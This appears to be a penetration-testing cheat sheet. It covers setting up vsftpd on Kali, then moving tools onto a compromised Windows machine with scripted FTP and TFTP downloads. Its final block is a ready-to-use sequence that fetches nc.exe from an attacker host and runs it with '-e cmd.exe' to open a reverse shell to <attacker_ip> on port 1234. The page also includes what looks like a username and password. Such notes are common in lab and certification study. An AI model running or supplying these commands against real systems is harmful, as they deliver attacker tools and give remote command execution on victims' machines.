!!! info ""

### vsftpd

    #### Installing vsftpd

    ```bash
    sudo apt-get install vsftpd
    sudo nano /etc/vsftpd.conf
    ```

    locate **write_enable=YES** and remove the **#** infront of it and save the file changes.

    #### Restart vsftpd  

    ```bash
    sudo systemctl restart vsftpd
    ```

    #### purging vsftpd

    ```bash
    sudo apt purge vsftpd
    ```


!!! info ""
    ### another way

    #### Set up a ftp downloading script on the target machine

    ```bash
    echo open IP 21 > ftp.txt
    echo USER acknak>> ftp.txt
    echo jLQRZy4gyLhmMqz2whTw>> ftp.txt
    echo ftp >> ftp.txt
    echo bin >> ftp.txt
    echo GET wget.exe >> ftp.txt
    echo bye >> ftp.txt
    ```

    #### Download the prepared file

    ```bash
    ftp -v -n -s:ftp.txt
    ```

    #### Start tftp server on Kali

    ```bash
    aftpd start
    ```

    #### Transfer files from Kali to Windows (from windows terminal)

    ```bash
    tftp -I IPADDRESS GET nameoffile.exe
    ```

    #### You can have a shell using this

    ```bash
    echo open <attacker_ip> 21> ftp.txt
    echo USER offsec>> ftp.txt
    echo ftp>> ftp.txt
    echo bin >> ftp.txt
    echo GET nc.exe >> ftp.txt
    echo bye >> ftp.txt
    ftp -v -n -s:ftp.txt
    nc.exe <attacker_ip> 1234 -e cmd.exe
    ```
